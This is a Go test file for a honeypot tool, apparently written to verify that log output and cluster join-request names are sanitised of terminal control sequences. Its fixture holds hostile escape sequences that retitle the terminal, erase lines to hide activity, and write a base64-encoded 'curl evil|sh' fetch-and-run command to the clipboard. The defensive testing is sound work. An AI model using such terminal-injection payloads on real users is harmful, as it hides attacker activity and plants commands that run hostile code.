package main

import (
	"io"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/qpot/qpot/internal/cluster"
	"github.com/qpot/qpot/internal/config"
)

// captureStdout runs fn with os.Stdout redirected and returns what it wrote.
func captureStdout(t *testing.T, fn func()) string {
	t.Helper()
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	old := os.Stdout
	os.Stdout = w
	done := make(chan string)
	go func() {
		b, _ := io.ReadAll(r)
		done <- string(b)
	}()
	defer func() { os.Stdout = old }()
	fn()
	w.Close()
	os.Stdout = old
	return <-done
}

// An attacker's terminal control sequences: set the window title, write the
// clipboard (OSC 52), and erase the line above, which hides an event.
const hostileText = "uname -a\x1b]0;owned\x07\x1b]52;c;Y3VybCBldmlsfHNo\x07\x1b[1A\x1b[2K\x9b2J"

// hasControl reports bytes a terminal acts on: ESC, BEL, a raw 8-bit CSI,
// or the C1 CSI as UTF-8.
func hasControl(s string) bool {
	for i := 0; i < len(s); {
		r, size := utf8.DecodeRuneInString(s[i:])
		if r == 0x1b || r == 0x07 || r == 0x9b || (r == utf8.RuneError && size == 1 && s[i] == 0x9b) {
			return true
		}
		i += size
	}
	return false
}

func assertTermSafe(t *testing.T, what, out string) {
	t.Helper()
	if hasControl(out) {
		t.Fatalf("%s passed terminal control characters through: %q", what, out)
	}
	if !strings.Contains(out, "uname -a") {
		t.Fatalf("%s lost the text around the control characters: %q", what, out)
	}
}

// TestLogsEscapeAttackerControlSequences: honeypot logs carry what attackers
// typed (cowrie logs every command), and `qpot logs` printed it raw, so an
// attacker could retitle the operator's terminal, set their clipboard (OSC 52)
// or erase lines to hide their own activity.
func TestLogsEscapeAttackerControlSequences(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("fake docker is a shell script")
	}
	t.Setenv("HOME", t.TempDir())
	t.Setenv("USERPROFILE", os.Getenv("HOME"))
	bin := t.TempDir()
	script := "#!/bin/sh\nprintf 'cowrie-1  | CMD: %s\\n' \"$QPOT_FAKE_LINE\"\n"
	if err := os.WriteFile(filepath.Join(bin, "docker"), []byte(script), 0o755); err != nil { // #nosec G306 -- test helper must be executable
		t.Fatal(err)
	}
	t.Setenv("PATH", bin+string(os.PathListSeparator)+os.Getenv("PATH"))
	t.Setenv("QPOT_FAKE_LINE", hostileText)
	cfg := config.Default("logs-esc")
	cfg.Security.SandboxMode = "none"
	if err := config.Save(cfg); err != nil {
		t.Fatal(err)
	}
	out := captureStdout(t, func() {
		cmd := newLogsCommand()
		cmd.SetArgs([]string{"-i", "logs-esc"})
		if err := cmd.Execute(); err != nil {
			t.Error(err)
		}
	})
	assertTermSafe(t, "qpot logs", out)
}

// TestClusterRequestsEscapeJoinerNames: the host reviews pending joins in its
// terminal, and the hostname and instance name are whatever the joiner sent.
func TestClusterRequestsEscapeJoinerNames(t *testing.T) {
	dir := clusterHome(t)
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	port := ln.Addr().(*net.TCPAddr).Port
	ln.Close()
	const pw = "correct-horse-battery"
	host := cluster.NewManager(dir)
	cfg := cluster.DefaultClusterConfig()
	cfg.BindAddr, cfg.BindPort = "127.0.0.1", port
	cl, err := host.InitCluster("prod", pw, cfg)
	if err != nil {
		t.Fatal(err)
	}
	if err := host.Start(); err != nil {
		t.Fatal(err)
	}
	defer host.Stop()
	host.HandleJoinRequest(&cluster.JoinRequest{Version: cluster.ProtocolVersion, NodeCSR: testNodeCSR(t), ClusterID: cl.ID, Password: pw, PollSecret: strings.Repeat("p", 32), NodeName: hostileText,
		InstanceName: "\x1b[31mprod", NodeAddress: "10.0.0.8", NodePort: 7946}, "10.0.0.8")

	out := captureStdout(t, func() {
		cmd := newClusterRequestsCommand()
		cmd.SetArgs([]string{"--password", pw})
		if err := cmd.Execute(); err != nil {
			t.Error(err)
		}
	})
	if hasControl(out) {
		t.Fatalf("cluster requests passed terminal control characters through: %q", out)
	}
}

// FuzzTermSafe: nothing a terminal acts on survives, and plain text is kept.
func FuzzTermSafe(f *testing.F) {
	for _, s := range []string{hostileText, "plain text", "tab\tok", "\xff\xfe", "é ü 漢字", "\xe2\x80\xaeevil" /* U+202E */, "\r\n"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		got := termSafe(s)
		if hasControl(got) || strings.ContainsAny(got, "\r\n\x00\xe2\x80\xae") {
			t.Fatalf("termSafe(%q) = %q", s, got)
		}
		for _, r := range got {
			if r < 0x20 && r != '\t' || r >= 0x7f && r <= 0x9f {
				t.Fatalf("termSafe(%q) kept control %U", s, r)
			}
		}
		if isPlain(s) && got != s {
			t.Fatalf("termSafe changed plain text %q to %q", s, got)
		}
	})
}

// isPlain reports valid UTF-8 text with nothing termSafe has to escape.
func isPlain(s string) bool {
	if !utf8.ValidString(s) {
		return false
	}
	for _, r := range s {
		if r < 0x20 && r != '\t' || r >= 0x7f && r <= 0x9f || r >= 0x202a && r <= 0x202e || r >= 0x2066 && r <= 0x2069 {
			return false
		}
	}
	return true
}
